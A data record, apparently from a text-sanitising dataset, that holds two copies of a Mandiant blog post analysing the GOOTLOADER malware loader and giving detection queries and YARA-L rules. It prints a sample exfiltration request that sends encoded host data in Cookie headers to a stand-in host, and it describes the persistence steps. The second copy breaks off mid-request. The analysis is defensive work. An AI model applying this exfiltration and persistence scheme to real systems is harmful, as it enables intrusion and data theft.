@@ -1,0 +1,1333 @@
+{
+  "original_txt": "Welcome to the Finding Malware Series\nThe \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats. This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform. You can read the other installments to the series here. Happy hunting!\nAbout GOOTLOADER\nAlso known as: SLOWPOUR, Gootkit Loader\nGOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021. In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites. These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.\nGOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment. Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.\nMandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques. This has likely been done by the malware authors as a way to evade detection.\nDelivery\nIn typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning. Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search. Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.\nBoth the archive and the JavaScript file have names that closely resemble the victim's search query. This naming scheme helps trick the user into extracting and executing the malware.\nFigure 1: Screenshot of a compromised web page distributing GOOTLOADER malware (captured March 2024)\nGOOTLOADER Infection Chain\nThe typical GOOTLOADER infection chain consists of the following:\n- .zip archive is downloaded from a compromised WordPress website.\n- .js file (GOOTLOADER) from the .zip archive is extracted and executed.\n- This initial .js script saves a second stage payload to %AppData% with a .dat or .log file extension.\n- The .dat/.log file is renamed to .js.\n- A scheduled task is created to run the second stage .js file.\n- The second stage file decodes and executes an embedded GOOTLOADER.POWERSHELL payload that reaches out to the C2.\nFigure 2: GOOTLOADER components\nThe stages of the infection chain are explained in further detail below.\nFirst Stage JavaScript Execution\nThe extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it. This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.\nThe typical first stage process tree during an infection is as follows:\nexplorer.exe\n↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware)\nDespite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog. This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.\nFigure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.\nSecond Stage JavaScript Execution\nGOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log. It is then renamed to .js. These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.\nA scheduled task is created in order to launch the second stage .js file. The task serves as a form of persistence and a way to execute the second stage file for the first time.\nThe name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”. The task will run at every user login, and the task action (command) will be set to the following:\nwscript <SECOND_STAGE_8.3_FILENAME>.JS\nExecution of the scheduled task results in the following process tree, where the second stage .js file is first executed by wscript.exe which in turn runs the file with cscript.exe\nsvchost.exe (Scheduled Task)\n↳ \"C:\\\\WINDOWS\\\\system32\\\\wscript.EXE\" <SECOND_STAGE_8.3_FILENAME>~1.JS\n↳ \"C:\\\\Windows\\\\System32\\\\cscript.exe\" \"<SECOND_STAGE_8.3_FILENAME>~1.JS\"\n↳ powershell\nGOOTLOADER.POWERSHELL Execution\nThe second stage JavaScript decodes an embedded PowerShell script which Mandiant tracks as GOOTLOADER.POWERSHELL. This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability):\n1. The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function\nFigure 4: Initial PowerShell loop\n2. The c2_connect function acquires data about the host such as the operating system, environment variables, running processes, files/folders, and storage drives.\nFigure 5: c2_connect function\n3. The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server. Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>). This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes. Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024. Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.\nFigure 6: data encoding function\n4. The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.\nBelow is a sample of an HTTP GET request with the $unique_id 1234567890. The numbers 1 to 4 are appended to the $unique_id and represent the type of system information.\n- 1234567890 – environment variables and OS information\n- 12345678901 – running processes\n- 12345678902 – running desktop applications\n- 12345678903 – files, links, and folders on the desktop\n- 12345678904 – local disk drives with size of used disk space\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nCookie: 1234567890=DwxFwXG9220+H4sIAAAAAAAEAJVVW2+bMBT+K6C9bNKKcmvSLk8UnMQdxsh2kk5CIJa4LSvBCOhN4sfPJqEhTZVuD1x8zufDuXyfMR1nTgGhHsET6IDA+uF7ubjLo40dlVGlm55nm8xU9nnB88KHQD19M8sUwCci2sTpXaVb92IlkqjkrzAtyihJ3oXyV2+ANtiJitKLyvt5tpbLoNvvn48ueqPz3rB73h8MLkdtMBMiKRyxispYpCp+bZAIBwKXuSYCwb0oyjTacGkUm41IdxlM4oQXrYy02uBvMdvFRzu+vlwMvx1t02rzqc3L4aDf+/RzGHlzBkidN6LAnoIldLudOhbN+EoFWMbpWjwXfvFalHzT7/mrzdrgL7I+O4+feK5a28bRBrd1F/4eVulTIaa8JEKU74ez9VT6DCNgE7hQRNiuPJPNgoPZV/q1uTBD5TwuEWc8vbZ/+n/WD2e9rtExuhJu//wPtIMt0/mMdooEicJOsSvpuwAk8P2DHrpzdAVIiCehpLYFKMWEBoNKxymvW3IUunFICA127QxdVumqA+CGBYYc2NgAN2BsXJlsbFjIHhuLK6pu0nZN1SVflnSibrOxgag1Nrxf6lpKvOfIYE0yoUmsGWTAYnMCAhPZw0HbC23JaDiBsjCYljwZDrSJVFryqg01JNY80UaXGi15lkn1aZ3v2pSnj3HKa3A7kAMWwAmGbRMBC0ghdoPBbUd2qsWDI/mflM+h+5RW3pAfC0O651cOtPYz8R5/J/Gq0om5DBnGDg1tSFqKp7ISWUEtHWJ7Z2yVfZGlbNnfzLdZN4TfDbXSGUDeaWr5jG8yCfxXnEwxdCBlTZptbaF4lYtC3JZ7kZZRXmpITqwBFk1h+0h0hgmz5uwoAZsXD6XItjuMJH2odHWE2xiZ0D08SPb2kGATQXfanPNHsLqVjcCVofVHOFT/AoVSCQi7HxUbLlClP8s64/yg5ZguEQzeWqHtHFq3owFJ2TzL44Jr4ClKHuvT/S+grmmPmAYAABsMr3rFZrDa0g==;\n12345678901=DwxFwXG9220+H4sIAAAAAAAEAGVR7W7bMAx8lfoF/A5Z6jUeVjSI2xX7FSgWY2uRRIGUvwA//Cjba4sMBijpjjyTvF0I1tQqGvTfSTk4IMc5uxAODHSW8wY0ZzX6diFqJmY54tWhnzOteC3Q1q4JenBzBmOwSKnwij5q6lfuaV+8G69FeteAF6BBbCyckUX/apqzWuGnBf7F/9JKbWHOfmKD/q2cM8sq9fAMDml62KMLBMwm9fNsakLGa8yP\nLUbkL0ihG7h77o93QHW4A96CVlHKHOtYz9mLh0cyvQABByBuwdqv97Nh4UiH2powZydoDEeaBOouEk+dj8bBt22pFSiq29JrGD+facAK6o5MnA6gbGwroN7U8B88ibQSVV55mbVqyH2Ip36KMQAZ8PVmK5vViOo2BTiADSmTXdomB0TLvXAhFGOUrb5c/iQ4cC+TS9hK5bcgFkfFt4QMc7Z5mr/vTsf8R/n60fBGlD4CeWXzZBWyulhYuss/2+P8FcZY+tDFfIm7IPsb\njJcvLheb3BdJZ47UV8Wc/caOxGQPfwEdasVywgIAABsMr3rFZrDa0g==;\n12345678902=DwxFwXG9220+H4sIAAAAAAAEAHMsKMjJTE4syczPcytKzE31yC8uifPNTC7KL85PK1FwTUlPrVGE80Fc/LLOARjyBfnlqUXFGak5OXHhmXkp+eXFCgEgoWCQELJ0fGZxKhYlCp7BrgA6l998pwAAABsMr3rFZrDa0g==; 12345678903=DwxFwXG9220+H4sIAAAAAAAEAF2KQQrCMBBFrzI9gGLtDWxdCNIGqQeI8YODcaZMokXI4c3a1X+P99v5wYlcX5r2gvANEXRgqdarZNNIzgti9dPxmmAVznwzb4xUmu7/NCKvas9Kk2Aw/oA25GBJxde+H7HStEAGDe8XJJMzpLo+s8pW70tpdrNqTD9F+wIAlwAAABsMr3rFZrDa0g==;\n12345678904=DwxFwXG9220+H4sIAAAAAAAEAHOOM7YwMDM2NrI0sjAAAKRsSCYNAAAAGwyvesVmsNrS\nHost: example[.]com\nConnection: Close\nThe contents of the HTTP Cookie header can be decoded using the CyberChef recipe below. The CyberChef recipe performs the following actions:\n- Decode the data from Base64\n- Use regex to extract data from the gzip magic bytes (1F 8B) until the end (00) of the line\n- Decompress the result using Gunzip.\nFrom_Base64('A-Za-z0-9+/=',true,false)\nTo_Hex('Space',0)\nRegular_expression('User defined','1f 8b.*(00)',true,true,false,false,false,false,'List matches')\nFrom_Hex('Auto')\nGunzip()\nFigure 7: CyberChef recipe that decodes data\n5. If the C2 responds to the GOOTLOADER.POWERSHELL request, then an additional payload is downloaded and executed using PowerShell’s Invoke-Expression cmdlet. Note that the C2 response must contain the host’s $unique_id in order for the command to execute. In some instances this response can occur several hours after the initial infection.\nIn the past the payload was FONELAUNCH, a .NET-based launcher that is written to the registry. However, in mid-2024 this has changed to a malicious DLL file that is executed using a renamed copy of rundll32.exe. In some instances this DLL file has been associated with CLEANBOOST, a backdoor malware.\nFurther steps in GOOTLOADER infections vary, but these initial compromises can lead to lateral movement in the environment followed by financially-motivated threat actor activity like ransomware deployment.\nThreat Hunting & Detection in Google SecOps\nHunting Opportunities\nMandiant Hunt surfaces otherwise undetected malicious activity by employing a detection strategy that uses both strong signals (high enough fidelity to be reviewed 1:1) and weak signals (low fidelity on their own but provide broad coverage of threat actor tactics) to enumerate attacker activity in customer environments. These signals are used to sequentially funnel petabytes of telemetry data to a practicable number of enriched and highly curated cases for analyst review. Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.\nGoogle SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics:\n- Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives. This is a common delivery mechanism for many malware families, including GOOTLOADER.\nThese events map to MITRE ATT&CK Technique T1204.002 - User Execution: Malicious File. Some examples include: - C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\Legal_document_example_search_94721.zip\\\\legal document example search 90126.js\n- C:\\\\Users\\\\<User>\\\\AppData\\\\Local\\\\Temp\\\\fd3d6123-433a-4efb-a123-c43af0fa2f29_Legal_document_example_search(94721).zip.a58\\\\legal_document_example_search(90126).js\nUse the UDM query below in Google Security Operations to identify such file writes. The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain.\n(\nmetadata.event_type = \"FILE_CREATION\" OR\nmetadata.event_type = \"FILE_MODIFICATION\"\n) AND\n(\ntarget.file.full_path = /users/ nocase AND\n(\ntarget.file.full_path = /\\\\.zip/ nocase OR\ntarget.file.full_path = /\\\\.rar/ nocase\n) AND\n(\ntarget.file.full_path = /vbs$/ nocase OR\ntarget.file.full_path = /js$/ nocase OR\ntarget.file.full_path = /hta$/ nocase OR\ntarget.file.full_path = /wsf$/ nocase OR\ntarget.file.full_path = /iso$/ nocase OR\ntarget.file.full_path = /img$/ nocase OR\ntarget.file.full_path = /vhd$/ nocase\n) AND\n(\nprincipal.process.file.full_path = /rar/ nocase OR\nprincipal.process.file.full_path = /7z/ nocase OR\nprincipal.process.file.full_path = /explorer/ nocase\n) AND\nNOT target.file.full_path = /setup\\\\.hta$/ nocase AND\nNOT target.file.full_path = /\\\\\\\\VSCode\\\\\\\\/ nocase AND\nNOT target.file.full_path = /index\\\\.js$/ nocase AND\nNOT target.file.full_path = /jquery/ nocase AND\nNOT target.file.full_path = /INetCache/ nocase\n)\n- HTTP request with header containing long “Cookie” value - Mandiant has observed GOOTLOADER infections lead to exfiltration of host information via HTTP requests containing the data in the header. These events map to MITRE ATT&CK Technique T1041 - Exfiltration Over C2 Channel.\nUse the UDM query below in Google Security Operations to identify such exfiltration.\n(\nmetadata.event_type = \"NETWORK_CONNECTION\" OR\nmetadata.event_type = \"NETWORK_HTTP\"\n) AND\ntarget.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/\n- Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe. In such compromises, the instance of cscript.exe launches a JavaScript file, which is an uncommon event in most environments. These events map to MITRE ATT&CK Technique T1059.007 - Command and Scripting Interpreter: JavaScript.\nUse the UDM query below in Google Security Operations to identify process events where wscript.exe launches cscript.exe to execute a non-VBScript file. While not necessarily malicious, this activity is uncommon in most environments and should be investigated to determine if it was legitimate.\nprincipal.process.file.full_path = /wscript\\\\.exe/ nocase AND\ntarget.process.file.full_path = /cscript\\\\.exe/ nocase AND\nNOT principal.process.command_line = /\\\\.vbs/ nocase AND\nNOT target.process.command_line = /\\\\.vbs/ nocase\n- PowerShell filewrites to AppData\\\\Roaming or AppData\\\\Local\\\\Temp - Following exfiltration of host information, Mandiant has observed GOOTLOADER compromises lead to PowerShell downloading additional payloads. In some instances, the additional payloads included a portable executable and a DLL file, with obfuscated file names and extensions. These events map to MITRE ATT&CK Technique T1059.001 - Command and Scripting Interpreter: PowerShell.\nUse the UDM query below in Google Security Operations to identify PowerShell writing files with suspicious extensions to either the AppData\\\\Roaming or AppData\\\\Local\\\\Temp directories. The detection logic will likely find numerous innocuous events in your environment, so add exclusions to those already included at the bottom of the query to filter out the noise until interesting results remain. This activity is not exclusive to GOOTLOADER compromises; Mandiant has observed many malware families leveraging these directories to store malicious files.\n(\nmetadata.event_type = \"FILE_CREATION\" OR\nmetadata.event_type = \"FILE_MODIFICATION\"\n) AND\n(\nprincipal.process.file.full_path = /\\\\\\\\powershell\\\\.exe$/ nocase AND\n(\ntarget.file.full_path = /\\\\\\\\AppData\\\\\\\\Roaming(\\\\\\\\[^\\\\\\\\\\\\/]+)?\\\\\\\\[^\\\\\\\\\\\\/]+\\\\.(svg|zip|rar|asp|png|jpg|iso|7z|html|doc|[A-Za-z]{5,8})$/ OR\ntarget.file.full_path = /\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\[^\\\\\\\\\\\\/]+\\\\.(svg|zip|rar|asp|jpg|iso|7z|doc)$/\n) AND\n(\nprincipal.process.parent_process.file.full_path = /\\\\\\\\explorer\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\cmd\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\mshta\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\RuntimeBroker\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\WinRAR\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\sihost\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\Installer\\\\.exe/ nocase OR\nprincipal.process.parent_process.file.full_path = /\\\\\\\\cmd\\\\.exe/ nocase\n)\n)\nGoogle Security Operations Enterprise and Enterprise Plus customers will benefit from these detections being applied automatically through curated detections. Standard customers can use the YARA-L rules below to create single or multi-event rules to detect the malware. You can even ask Gemini in Google Security Operations to do it for you.\n- This rule detects the extraction of a GOOTLOADER js file to a Temp folder:\nrule gootloader_js_extract\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"This rule matches the extraction of a GOOTLOADER js file by explorer.exe.\"\nmitre_attack_tactic = \"Execution\"\nmitre_attack_technique = \"User Execution: Malicious File\"\nmitre_attack_url = \"https://attack.mitre.org/techniques/T1204/002/\"\nmitre_attack_version = \"v15.1\"\nseverity = \"High\"\npriority = \"High\"\nplatform = \"Windows\"\ntype = \"hunt\"\nevents:\nre.regex($e.file_path, `\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+(_|\\\\s|\\\\()\\\\d{4,5}.?\\\\.zip.+\\\\.js$`) nocase\nand\nre.regex($e.principal.process.file.full_path, `explorer\\\\.exe`) nocase\nand\n$e.metadata.event_type = \"FILE_CREATION\"\ncondition:\n$e\n}\n- This rule identifies the execution of GOOTLOADER malware from the Temp folder:\nrule gootloader_js_execute\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"This rule matches the execution of a GOOTLOADER js file from a temporary directory.\"\nmitre_attack_tactic = \"Execution\"\nmitre_attack_technique = \"Command and Scripting Interpreter: JavaScript\"\nmitre_attack_url = \"https://attack.mitre.org/techniques/T1059/007/\"\nmitre_attack_version = \"v15.1\"\nseverity = \"High\"\npriority = \"High\"\nplatform = \"Windows\"\ntype = \"hunt\"\nevents:\nre.regex($e.target.process.command_line, `wscript\\\\.exe.+\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+\\\\.js`) nocase\nor\nre.regex($e.principal.process.command_line, `wscript\\\\.exe.+\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\.+\\\\.js`) nocase\ncondition:\n$e\n}\n- This rule identifies the creation of a large .dat, .log, or .js file by wscript.exe:\nrule gootloader_second_stage_create\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"This rule matches the creation of a large .dat, .log, or .js file by wscript.exe\"\nmitre_attack_tactic = \"Execution\"\nmitre_attack_technique = \"Command and Scripting Interpreter: JavaScript\"\nmitre_attack_url = \"https://attack.mitre.org/techniques/T1059/007/\"\nmitre_attack_version = \"v15.1\"\nseverity = \"High\"\npriority = \"High\"\nplatform = \"Windows\"\ntype = \"hunt\"\nevents:\nre.regex($e.target.file.full_path, `\\\\\\\\users\\\\\\\\.+\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\.+\\\\.(js|log|dat)$`) nocase\nand\n$e.metadata.event_type = \"FILE_CREATION\"\nand\nre.regex($e.principal.process.file.full_path, `wscript`) nocase\nand\n$e.target.file.size >= 4000000\ncondition:\n$e\n}\n- This rule identifies the creation of a GOOTLOADER scheduled task that executes a .js file using its 8.3 filename:\nrule gootloader_task_create\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"This rule matches the creation of a scheduled task that uses an 8.3 filename and a .js extension\"\nmitre_attack_tactic = \"Execution\"\nmitre_attack_technique = \"Scheduled Task/Job: Scheduled Task\"\nmitre_attack_url = \"https://attack.mitre.org/techniques/T1053/005/\"\nmitre_attack_version = \"v15.1\"\nseverity = \"High\"\npriority = \"High\"\nplatform = \"Windows\"\ntype = \"hunt\"\nevents:\n($e.metadata.event_type = \"SCHEDULED_TASK_CREATION\" or\n$e.metadata.event_type = \"SCHEDULED_TASK_MODIFICATION\")\nand\nre.regex($e.target.process.command_line, `(c|w)script(\\\\.exe)?(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase\ncondition:\n$e\n}\n- This rule identifies the execution of a GOOTLOADER scheduled task that executes a .js file using its 8.3 filename:\nrule gootloader_task_execute\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"This rule matches the execution of a GOOTLOADER scheduled task that uses an 8.3 filename.\"\nmitre_attack_tactic = \"Execution\"\nmitre_attack_technique = \"Scheduled Task/Job: Scheduled Task\"\nmitre_attack_url = \"https://attack.mitre.org/techniques/T1053/005/\"\nmitre_attack_version = \"v15.1\"\nseverity = \"High\"\npriority = \"High\"\nplatform = \"Windows\"\ntype = \"hunt\"\nevents:\nre.regex($e.target.process.command_line, `(c|w)script\\\\.exe(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase or\nre.regex($e.principal.process.command_line, `(c|w)script\\\\.exe(\"|\\\\s){1,3}[A-Z0-9]{6}~1\\\\.js`) nocase\ncondition:\n$e\n}\nHave questions or feedback for the Managed Defense team? Comment on the blog or ask a question in the Managed Defense Forum.",
+  "sanitized_txt": "Welcome to the Finding Malware Series The \"Finding Malware\" blog series from Managed Defense is designed to empower the Google Security Operations community to detect emerging and persistent malware threats. This post dives into the GOOTLOADER malware family and the detection opportunities available within the Google Security Operations (SecOps) platform. You can read the other installments to the series here. Happy hunting!\nAbout GOOTLOADER Also known as: SLOWPOUR, Gootkit Loader GOOTLOADER is an obfuscated JavaScript downloader which Mandiant has observed being distributed in multiple campaigns since 2021. In such campaigns, victims are tricked via search engine optimization (SEO) poisoning into downloading archives from compromised websites. These archives contain the GOOTLOADER malware, which users then extract and execute on hosts.\nGOOTLOADER has been distributed by financially-motivated threat actors including UNC2565 as a means of initial access to an environment. Successful GOOTLOADER infections have led to data exfiltration, extortion, and ransomware deployment, as highlighted in a CISA advisory from August 2024.\nMandiant Managed Defense has observed the constant evolution of the GOOTLOADER malware such as the addition of new payloads and obfuscation techniques. This has likely been done by the malware authors as a way to evade detection.\nDelivery In typical campaigns distributing GOOTLOADER, victims are lured into visiting compromised WordPress websites via SEO poisoning. Victims perform a search, often for business-related documents such as legal requirements, agreements, or contracts, and navigate to a compromised site with information purportedly related to their search. Victims then download an archive containing the malware, and extract and execute the malicious JavaScript file.\nBoth the archive and the JavaScript file have names that closely resemble the victim's search query. This naming scheme helps trick the user into extracting and executing the malware.\nFigure 1: Screenshot of a compromised web page distributing GOOTLOADER malware (captured March 2024) GOOTLOADER Infection Chain The typical GOOTLOADER infection chain consists of the following:\n- .zip archive is downloaded from a compromised WordPress website.\n- .js file (GOOTLOADER) from the .zip archive is extracted and executed.\n- This initial .js script saves a second stage payload to %AppData% with a .dat or .log file extension.\n- The .dat/.log file is renamed to .js.\n- A scheduled task is created to run the second stage .js file.\n- The second stage file decodes and executes an embedded GOOTLOADER.POWERSHELL payload that reaches out to the C2.\nFigure 2: GOOTLOADER components The stages of the infection chain are explained in further detail below.\nFirst Stage JavaScript Execution The extracted JavaScript is typically an open-source JavaScript library file, with the GOOTLOADER code embedded in it. This technique aims to avoid detection by hiding an obfuscated JavaScript payload within a legitimate JavaScript library file.\nThe typical first stage process tree during an infection is as follows:\nexplorer.exe ↳ \"C:\\\\Windows\\\\System32\\\\WScript.exe\" \"C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\<ZIP_FILE_NAME>.zip\\\\<JS_FILE_NAME>.js\" (Execution of the downloaded malware) Despite being obfuscated, it is possible to extract the malware configuration from the first stage .js file by leveraging this Python script as described in a previous blog. This capability is also available to VirusTotal Enterprise users under the Malware configuration file section.\nFigure 3: Managed Defense’s Backscatter script allows VT Enterprise users to extract GOOTLOADER configurations using the Backscatter script.\nSecond Stage JavaScript Execution GOOTLOADER contains an obfuscated second stage payload that is decoded and saved to C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Roaming\\\\<RANDOM_DIRECTORY>\\\\<HARD_CODED_FILE_NAME> with a file extension of .dat or .log. It is then renamed to .js. These file names are hard-coded in the original .js script file, and the file is padded with 40-60MB of junk characters in order to increase its size and avoid detection.\nA scheduled task is created in order to launch the second stage .js file. The task serves as a form of persistence and a way to execute the second stage file for the first time.\nThe name of the scheduled task is hard-coded into the malware and usually includes business themes such as “Regulatory Communication” or “Motivated Operations”. The task will run at every user login, and the task action (command) will be set to the following:\nwscript <SECOND_STAGE_8.3_FILENAME>.JS Execution of the scheduled task results in the following process tree, where the second stage .js file is first executed by wscript.exe which in turn runs the file with cscript.exe svchost.exe (Scheduled Task) ↳ \"C:\\\\WINDOWS\\\\system32\\\\wscript.EXE\" <SECOND_STAGE_8.3_FILENAME>~1.JS ↳ \"C:\\\\Windows\\\\System32\\\\cscript.exe\" \"<SECOND_STAGE_8.3_FILENAME>~1.JS\" ↳ powershell GOOTLOADER.POWERSHELL Execution The second stage JavaScript decodes an embedded PowerShell script which Mandiant tracks as GOOTLOADER.POWERSHELL. This PowerShell script performs the following steps (note that the script has been deobfuscated and its randomly-named functions/variables renamed to improve readability):\n1. The script starts with a while loop that randomly selects 1 of 10 hard-coded URLs and passes it to the c2_connect function Figure 4: Initial PowerShell loop 2. The c2_connect function acquires data about the host such as the operating system, environment variables, running processes, files/folders, and storage drives.\nFigure 5: c2_connect function 3. The script Base64 encodes the collected information and compresses it using gzip before sending it to the C2 server. Prior to Base64 encoding, the script adds hard-coded bytes to the beginning and end of the data (<bytes><gzip-Data><bytes>). This serves as a form of obfuscation, making it challenging to decode the compressed information without prior knowledge of those specific bytes. Note that Mandiant observed this additional obfuscation step in GOOTLOADER.POWERSHELL compromises beginning roughly in June 2024. Previous versions of GOOTLOADER.POWERSHELL did not have this additional step.\nFigure 6: data encoding function 4. The gzip-encoded data along with a hard coded unique identifier ($unique_id) is placed in the HTTP Cookie header and sent through an HTTP GET request.\nBelow is a sample of an HTTP GET request with the $unique_id 1234567890. The numbers 1 to 4 are appended to the $unique_id and represent the type of system information.\n- 1234567890 – environment variables and OS information - 12345678901 – running processes - 12345678902 – running desktop applications - 12345678903 – files, links, and folders on the desktop - 12345678904 – local disk drives with size of used disk space GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Cookie: 1234567890=DwxFwXG9220+H4sIAAAAAAAEAJVVW2+bMBT+K6C9bNKKcmvSLk8UnMQdxsh2kk5CIJa4LSvBCOhN4sfPJqEhTZVuD1x8zufDuXyfMR1nTgGhHsET6IDA+uF7ubjLo40dlVGlm55nm8xU9nnB88KHQD19M8sUwCci2sTpXaVb92IlkqjkrzAtyihJ3oXyV2+ANtiJitKLyvt5tpbLoNvvn48ueqPz3rB73h8MLkdtMBMiKRyxispYpCp+bZAIBwKXuSYCwb0oyjTacGkUm41IdxlM4oQXrYy02uBvMdvFRzu+vlwMvx1t02rzqc3L4aDf+/RzGHlzBkidN6LAnoIldLudOhbN+EoFWMbpWjwXfvFalHzT7/mrzdrgL7I+O4+feK5a28bRBrd1F/4eVulTIaa8JEKU74ez9VT6DCNgE7hQRNiuPJPNgoPZV/q1uTBD5TwuEWc8vbZ/+n/WD2e9rtExuhJu//wPtIMt0/mMdooEicJOsSvpuwAk8P2DHrpzdAVIiCehpLYFKMWEBoNKxymvW3IUunFICA127QxdVumqA+CGBYYc2NgAN2BsXJlsbFjIHhuLK6pu0nZN1SVflnSibrOxgag1Nrxf6lpKvOfIYE0yoUmsGWTAYnMCAhPZw0HbC23JaDiBsjCYljwZDrSJVFryqg01JNY80UaXGi15lkn1aZ3v2pSnj3HKa3A7kAMWwAmGbRMBC0ghdoPBbUd2qsWDI/mflM+h+5RW3pAfC0O651cOtPYz8R5/J/Gq0om5DBnGDg1tSFqKp7ISWUEtHWJ7Z2yVfZGlbNnfzLdZN4TfDbXSGUDeaWr5jG8yCfxXnEwxdCBlTZptbaF4lYtC3JZ7kZZRXmpITqwBFk1h+0h0hgmz5uwoAZsXD6XItjuMJH2odHWE2xiZ0D08SPb2kGATQXfanPNHsLqVjcCVofVHOFT/AoVSCQi7HxUbLlClP8s64/yg5ZguEQzeWqHtHFq3owFJ2TzL44Jr4ClKHuvT/S+grmmPmAYAABsMr3rFZrDa0g==;\n12345678901=DwxFwXG9220+H4sIAAAAAAAEAGVR7W7bMAx8lfoF/A5Z6jUeVjSI2xX7FSgWY2uRRIGUvwA//Cjba4sMBijpjjyTvF0I1tQqGvTfSTk4IMc5uxAODHSW8wY0ZzX6diFqJmY54tWhnzOteC3Q1q4JenBzBmOwSKnwij5q6lfuaV+8G69FeteAF6BBbCyckUX/apqzWuGnBf7F/9JKbWHOfmKD/q2cM8sq9fAMDml62KMLBMwm9fNsakLGa8yP LUbkL0ihG7h77o93QHW4A96CVlHKHOtYz9mLh0cyvQABByBuwdqv97Nh4UiH2powZydoDEeaBOouEk+dj8bBt22pFSiq29JrGD+facAK6o5MnA6gbGwroN7U8B88ibQSVV55mbVqyH2Ip36KMQAZ8PVmK5vViOo2BTiADSmTXdomB0TLvXAhFGOUrb5c/iQ4cC+TS9hK5bcgFkfFt4QMc7Z5mr/vTsf8R/n60fBGlD4CeWXzZBWyulhYuss/2+P8FcZY+tDFfIm7IPsb jJcvLheb3BdJZ47UV8Wc/caOxGQPfwEdasVywgIAABsMr3rFZrDa0g==;\n12345678902=DwxFwXG9220+H4sIAAAAAAAEAHMsKMjJTE4syczPcytKzE31yC8uifPNTC7KL85PK1FwTUlPrVGE80Fc/LLOARjyBfnlqUXFGak5OXHhmXkp+eXFCgEgoWCQELJ0fGZxKhYlCp7BrgA6l998pwAAABsMr3rFZrDa0g==; 